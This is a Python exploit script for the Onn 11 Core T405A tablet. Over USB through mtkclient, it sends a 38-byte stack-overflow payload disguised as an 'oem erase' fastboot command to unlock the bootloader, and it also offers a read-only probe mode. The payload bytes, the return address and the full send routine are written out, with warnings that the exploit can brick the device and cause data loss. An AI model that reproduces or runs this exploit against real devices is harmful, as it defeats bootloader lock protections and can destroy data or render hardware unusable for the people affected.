#!/usr/bin/env python3
"""Onn 11 Core (2026) T405A raw-LK-fastboot tool.

--probe: read-only USB transport check.
--unlock: transmit the Nura Wiki documented LK oem-erase overflow payload.
This script is derived from the wiki's payload description.
A bad send could make the tablet unbootable.
"""

import argparse
import sys
import time

VENDOR = 0x0E8D
PRODUCT = 0x201C  # LK fastboot, NOT 0x2000 preloader or fastbootd
OVERFLOW = b"oem erase " + b"A" * 24 + bytes.fromhex("f8 83 f8 50")


def check_payload():
    assert len(OVERFLOW) == 38
    assert OVERFLOW.startswith(b"oem erase " + b"A" * 24)
    assert OVERFLOW[-4:] == bytes.fromhex("f8 83 f8 50")


def communicate(dev, out_ep, in_ep, data: bytes, timeout_ms=3500):
    n = dev.write(out_ep, data, timeout=timeout_ms)

    if n != len(data):
        raise RuntimeError(
            f"Short USB write: {n}/{len(data)} bytes"
        )

    return bytes(
        dev.read(in_ep, 512, timeout=timeout_ms)
    )


def main():
    parser = argparse.ArgumentParser(
        description="onn11Core T405A LK raw-fastboot diagnostic/exploit"
    )

    modes = parser.add_mutually_exclusive_group(required=True)

    modes.add_argument(
        "--probe",
        action="store_true",
        help="read-only LK fastboot check",
    )

    modes.add_argument(
        "--unlock",
        action="store_true",
        help="run high-risk LK exploit (changes device lock state)",
    )

    modes.add_argument(
        "--show-payload",
        action="store_true",
        help="show bytes without opening USB",
    )

    args = parser.parse_args()

    check_payload()

    if args.show_payload:
        print(f"Payload length: {len(OVERFLOW)} bytes")
        print(f"Payload hex:    {OVERFLOW.hex(' ')}")
        return

    try:
        import usb.core
        import usb.util
        from mtkclient.Library.Connection.usblib import UsbClass

    except ImportError as exc:
        sys.exit(
            f"Run this script from the mtkclient root "
            f"(with pyusb installed): {exc}"
        )

    if args.unlock:
        print(
            "WARNING: Sends an unaudited, device-specific "
            "stack-overflow payload."
        )

        print(
            "It modifies bootloader lock state, can brick this tablet, "
            "and makes a factory data reset necessary."
        )

        print(
            "Back up your files NOW: user data may become inaccessible "
            "after the exploit."
        )

        answer = input(
            "Type 'UNLOCK T405A' to proceed: "
        ).strip()

        if answer != "UNLOCK T405A":
            sys.exit(
                "Cancelled: no bytes transmitted"
            )

    backend = UsbClass().backend

    if backend is None:
        sys.exit(
            "MTKClient has no libusb backend; no data sent"
        )

    print(
        "Waiting up to 60 seconds for LK fastboot USB 0E8D:201C "
        "(disconnect/reconnect if needed)...",
        flush=True,
    )

    dev = None
    deadline = time.monotonic() + 60

    while time.monotonic() < deadline:
        try:
            dev = usb.core.find(
                idVendor=VENDOR,
                idProduct=PRODUCT,
                backend=backend,
            )

            if dev is not None:
                break

        except usb.core.USBError:
            pass

        time.sleep(0.1)

    if dev is None:
        sys.exit(
            "No LK fastboot interface 0E8D:201C found; "
            "no data sent"
        )

    try:
        try:
            cfg = dev.get_active_configuration()

            print(
                f"USB configuration already active: "
                f"{cfg.bConfigurationValue}"
            )

        except usb.core.USBError as exc:
            descriptor_cfg = dev[0]

            print(
                f"No active USB configuration ({exc}); "
                f"selecting {descriptor_cfg.bConfigurationValue}..."
            )

            try:
                dev.set_configuration(
                    descriptor_cfg.bConfigurationValue
                )

                cfg = dev.get_active_configuration()

            except usb.core.USBError as setup_error:
                sys.exit(
                    f"Could not activate USB configuration: "
                    f"{setup_error}. "
                    f"No Fastboot command or exploit sent"
                )

            print(
                f"USB configuration activated: "
                f"{cfg.bConfigurationValue}"
            )

        candidates = []

        for iface in cfg:
            bulk = [
                e for e in iface
                if usb.util.endpoint_type(e.bmAttributes)
                == usb.util.ENDPOINT_TYPE_BULK
            ]

            ins = [
                e for e in bulk
                if usb.util.endpoint_direction(e.bEndpointAddress)
                == usb.util.ENDPOINT_IN
            ]

            outs = [
                e for e in bulk
                if usb.util.endpoint_direction(e.bEndpointAddress)
                == usb.util.ENDPOINT_OUT
            ]

            if len(ins) == len(outs) == 1:
                candidates.append(
                    (
                        iface.bInterfaceNumber,
                        ins[0].bEndpointAddress,
                        outs[0].bEndpointAddress,
                    )
                )

        if len(candidates) != 1:
            sys.exit(
                f"Expected exactly one Fastboot bulk interface; "
                f"found {candidates}. No data sent"
            )

        iface_num, in_ep, out_ep = candidates[0]

        print(
            f"Found 0E8D:201C, interface {iface_num}, "
            f"BULK OUT {out_ep:#04x}, "
            f"BULK IN {in_ep:#04x}"
        )

        try:
            usb.util.claim_interface(
                dev,
                iface_num,
            )

        except usb.core.USBError as exc:
            sys.exit(
                f"Could not claim Fastboot USB interface: "
                f"{exc}. No command or exploit sent"
            )

        try:
            result = communicate(
                dev,
                out_ep,
                in_ep,
                b"getvar:is-userspace",
            )

            print(
                "getvar:is-userspace:",
                repr(result),
            )

            if (
                result.startswith(b"OKAYyes")
                or result.startswith(b"OKAY1")
            ):
                sys.exit(
                    "This is FASTBOOTD, not LK fastboot. "
                    "No exploit sent"
                )

            result = communicate(
                dev,
                out_ep,
                in_ep,
                b"getvar:unlocked",
            )

            print(
                "getvar:unlocked:",
                repr(result),
            )

            if not (
                result.startswith(b"OKAY")
                or result.startswith(b"FAIL")
            ):
                sys.exit(
                    "Unexpected Fastboot response. "
                    "No exploit sent"
                )

        except usb.core.USBError as exc:
            sys.exit(
                f"Fastboot read-only probe failed: "
                f"{exc}. No exploit sent"
            )

        if args.probe:
            print(
                "PROBE COMPLETE; no exploit sent "
                "and no flash changes requested."
            )
            return

        print(
            "Sending documented 38-byte raw LK Fastboot "
            "payload exactly once..."
        )

        try:
            response = communicate(
                dev,
                out_ep,
                in_ep,
                OVERFLOW,
                timeout_ms=5500,
            )

            print(
                "Exploit response:",
                repr(response),
            )

        except usb.core.USBError as exc:
            print(
                f"USB interrupted following payload: {exc}"
            )

        print(
            "DO NOT repeat immediately. "
            "Check whether the tablet rebooted "
            "and shows an orange warning."
        )

        print(
            "If it unlocks, Android may require "
            "a factory data reset via stock recovery."
        )

    finally:
        try:
            usb.util.dispose_resources(dev)

        except Exception:
            pass


if __name__ == "__main__":
    main()
